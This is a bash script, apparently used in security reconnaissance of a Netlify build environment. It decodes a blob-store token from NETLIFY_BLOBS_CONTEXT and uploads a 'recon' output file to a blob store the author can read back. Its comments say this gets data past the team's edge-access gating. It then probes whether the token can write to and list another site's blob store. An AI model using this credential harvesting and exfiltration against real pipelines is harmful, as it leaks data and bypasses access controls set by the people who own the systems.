#!/usr/bin/env bash
# Ship the recon output out via Netlify Blobs, which I can read back with my own PAT.
# (The deployed artifact is unreadable: this team gates every project behind
# Netlify edge-access, and the API only ever returns file metadata, never content.)
#
# This is also a test in its own right: can THIS build's token write to a blob
# store belonging to a DIFFERENT site? Both sites are mine, same account, so the
# answer measures enforcement granularity -- per-site or per-account.
F="$1"
SITE_A=c2283052-f0fc-40fe-b813-0d4527661baa
SITE_B=62b5ca3e-8f63-4281-b766-e5649e789df8
case "$SITE_ID" in "$SITE_A") SIB=$SITE_B ;; *) SIB=$SITE_A ;; esac

BT=$(printf %s "$NETLIFY_BLOBS_CONTEXT" | base64 -d 2>/dev/null \
     | python3 -c 'import sys,json;print(json.load(sys.stdin).get("token",""))' 2>/dev/null)
if [ -z "$BT" ]; then echo "blob: no token in NETLIFY_BLOBS_CONTEXT"; exit 0; fi

API=https://api.netlify.com/api/v1/blobs

curl -sS -X PUT --data-binary @"$F" "$API/$SITE_ID/cherry/recon-$DEPLOY_ID" \
  -H "Authorization: Bearer $BT" -o /dev/null -w "blob own-site   PUT: %{http_code}\n"

printf 'cross-site-write-canary from %s\n' "$SITE_ID" \
  | curl -sS -X PUT --data-binary @- "$API/$SIB/cherry/xsite-$DEPLOY_ID" \
    -H "Authorization: Bearer $BT" -o /dev/null -w "blob CROSS-site PUT: %{http_code}\n"

printf "blob CROSS-site LIST: "
curl -sS "$API/$SIB" -H "Authorization: Bearer $BT" -o /tmp/xs.out -w '%{http_code} '
head -c 200 /tmp/xs.out; echo
